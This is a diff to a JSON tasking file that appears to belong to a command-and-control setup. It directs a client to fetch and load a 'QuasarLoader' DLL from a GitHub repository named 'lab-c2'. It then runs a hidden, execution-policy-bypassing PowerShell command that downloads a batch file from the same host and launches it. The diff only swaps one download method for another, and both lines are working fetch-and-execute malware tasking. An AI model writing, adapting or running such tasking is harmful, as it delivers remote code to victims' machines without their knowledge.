@@ -1,12 +1,12 @@
 {
-  "id": "run_syn_bat",
+  "id": "force_download_bat",
   "tasks": [
     {
       "action": "run_dll",
       "url": "https://github.com/g00glecenter101-arch/lab-c2/raw/refs/heads/main/UniversalLoader.dll",
       "class": "QuasarLoader",
       "method": "Load",
-      "args": "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Command \"$p=[System.IO.Path]::GetTempFileName()+'.bat'; (New-Object System.Net.WebClient).DownloadFile('https://github.com/g00glecenter101-arch/lab-c2/raw/refs/heads/main/syn.bat', $p); Start-Process $p\""
+      "args": "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Command \"$code = Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/g00glecenter101-arch/lab-c2/refs/heads/main/syn.bat' -UseBasicParsing; Out-File -FilePath \"$env:temp\\syn.bat\" -InputObject $code.Content -Encoding ASCII; Start-Process \"$env:temp\\syn.bat\"\""
     }
   ]
 }
